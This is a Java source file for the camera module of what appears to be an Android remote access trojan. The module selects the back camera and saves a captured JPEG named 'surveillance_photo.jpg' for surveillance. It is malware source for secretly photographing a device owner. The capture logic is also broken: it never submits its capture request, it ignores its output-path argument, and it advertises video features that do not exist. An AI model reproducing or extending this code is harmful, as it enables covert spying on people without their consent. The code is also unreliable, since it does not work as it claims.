package com.security.test.rat.modules.surveillance;

import android.content.Context;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.CaptureResult;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.OutputConfiguration;
import android.hardware.camera2.params.SessionConfiguration;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Log;

import androidx.annotation.NonNull;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.concurrent.Executor;

/**
 * CameraModule - Implements camera surveillance functionality
 * 
 * Features:
 * - Photo capture
 * - Video recording
 * - Camera selection
 * - Image quality control
 */
public class CameraModule extends RATModule {
    
    private static final String TAG = "CameraModule";
    
    private Context context;
    private CameraManager cameraManager;
    private CameraDevice cameraDevice;
    private ImageReader imageReader;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private Executor executor;
    
    private boolean isInitialized = false;
    private String currentCameraId;
    
    public CameraModule(Context context) {
        super("CameraModule", "Camera surveillance operations");
        this.context = context;
        this.executor = context.getMainExecutor();
    }
    
    @Override
    public boolean initialize() {
        try {
            Log.i(TAG, "Initializing CameraModule");
            
            // Initialize camera manager
            cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            if (cameraManager == null) {
                Log.e(TAG, "Camera manager not available");
                return false;
            }
            
            // Find available cameras
            String[] cameraIds = cameraManager.getCameraIdList();
            if (cameraIds.length == 0) {
                Log.e(TAG, "No cameras available");
                return false;
            }
            
            // Select back camera by default
            currentCameraId = selectBackCamera(cameraIds);
            if (currentCameraId == null) {
                currentCameraId = cameraIds[0]; // Use first available camera
            }
            
            // Initialize background thread
            backgroundThread = new HandlerThread("CameraBackground");
            backgroundThread.start();
            backgroundHandler = new Handler(backgroundThread.getLooper());
            
            // Initialize image reader
            imageReader = ImageReader.newInstance(1920, 1080, android.graphics.ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(this::onImageAvailable, backgroundHandler);
            
            isInitialized = true;
            Log.i(TAG, "CameraModule initialized successfully with camera: " + currentCameraId);
            return true;
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to initialize CameraModule", e);
            return false;
        }
    }
    
    @Override
    public void cleanup() {
        try {
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            
            if (backgroundThread != null) {
                backgroundThread.quitSafely();
                try {
                    backgroundThread.join();
                } catch (InterruptedException e) {
                    Log.w(TAG, "Background thread interrupted during cleanup", e);
                }
                backgroundThread = null;
                backgroundHandler = null;
            }
            
            isInitialized = false;
            Log.i(TAG, "CameraModule cleaned up");
            
        } catch (Exception e) {
            Log.e(TAG, "Error during CameraModule cleanup", e);
        }
    }
    
    /**
     * Take a photo and save it to file
     */
    public boolean takePhoto(String outputPath) {
        if (!isInitialized) {
            Log.e(TAG, "CameraModule not initialized");
            return false;
        }
        
        try {
            Log.i(TAG, "Taking photo, output: " + outputPath);
            
            // Open camera
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    createCaptureSession();
                }
                
                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    Log.w(TAG, "Camera disconnected");
                    camera.close();
                }
                
                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    Log.e(TAG, "Camera error: " + error);
                    camera.close();
                }
            }, backgroundHandler);
            
            return true;
            
        } catch (SecurityException e) {
            Log.e(TAG, "Camera permission denied", e);
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Failed to take photo", e);
            return false;
        }
    }
    
    /**
     * Create camera capture session
     */
    private void createCaptureSession() {
        try {
            OutputConfiguration outputConfig = new OutputConfiguration(imageReader.getSurface());
            SessionConfiguration sessionConfig = new SessionConfiguration(
                SessionConfiguration.SESSION_REGULAR,
                java.util.Arrays.asList(outputConfig),
                executor,
                new SessionConfiguration.SessionStateCallback() {
                    @Override
                    public void onConfigured(@NonNull SessionConfiguration sessionConfiguration) {
                        Log.i(TAG, "Camera session configured");
                        captureStillPicture();
                    }
                    
                    @Override
                    public void onConfigureFailed(@NonNull SessionConfiguration sessionConfiguration) {
                        Log.e(TAG, "Failed to configure camera session");
                    }
                }
            );
            
            cameraDevice.createCaptureSession(sessionConfig);
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to create capture session", e);
        }
    }
    
    /**
     * Capture still picture
     */
    private void captureStillPicture() {
        try {
            CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(imageReader.getSurface());
            
            // Set capture parameters
            captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
            captureBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON);
            
            // Capture the image
            cameraDevice.createCaptureSession(
                java.util.Arrays.asList(imageReader.getSurface()),
                new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice camera) {
                        // Session already opened
                    }
                    
                    @Override
                    public void onDisconnected(@NonNull CameraDevice camera) {
                        camera.close();
                    }
                    
                    @Override
                    public void onError(@NonNull CameraDevice camera, int error) {
                        camera.close();
                    }
                },
                backgroundHandler
            );
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to capture still picture", e);
        }
    }
    
    /**
     * Handle captured image
     */
    private void onImageAvailable(ImageReader reader) {
        Image image = null;
        try {
            image = reader.acquireLatestImage();
            if (image != null) {
                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                byte[] bytes = new byte[buffer.capacity()];
                buffer.get(bytes);
                
                // Save image to file
                saveImageToFile(bytes);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing captured image", e);
        } finally {
            if (image != null) {
                image.close();
            }
        }
    }
    
    /**
     * Save image data to file
     */
    private void saveImageToFile(byte[] imageData) {
        File outputFile = new File(context.getExternalFilesDir(null), "surveillance_photo.jpg");
        
        try (FileOutputStream output = new FileOutputStream(outputFile)) {
            output.write(imageData);
            Log.i(TAG, "Photo saved to: " + outputFile.getAbsolutePath());
        } catch (IOException e) {
            Log.e(TAG, "Failed to save photo", e);
        }
    }
    
    /**
     * Select back camera from available cameras
     */
    private String selectBackCamera(String[] cameraIds) {
        for (String cameraId : cameraIds) {
            try {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    return cameraId;
                }
            } catch (CameraAccessException e) {
                Log.w(TAG, "Failed to get camera characteristics for " + cameraId, e);
            }
        }
        return null;
    }
    
    /**
     * Get camera information
     */
    public String getCameraInfo() {
        if (!isInitialized) {
            return "Camera module not initialized";
        }
        
        try {
            CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(currentCameraId);
            Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
            String facingStr = (facing != null && facing == CameraCharacteristics.LENS_FACING_BACK) ? "Back" : "Front";
            
            return String.format("Camera: %s, Type: %s, ID: %s", facingStr, getName(), currentCameraId);
            
        } catch (CameraAccessException e) {
            Log.e(TAG, "Failed to get camera info", e);
            return "Camera info unavailable";
        }
    }
    
    /**
     * Check if camera is available
     */
    public boolean isCameraAvailable() {
        return isInitialized && cameraManager != null;
    }
}
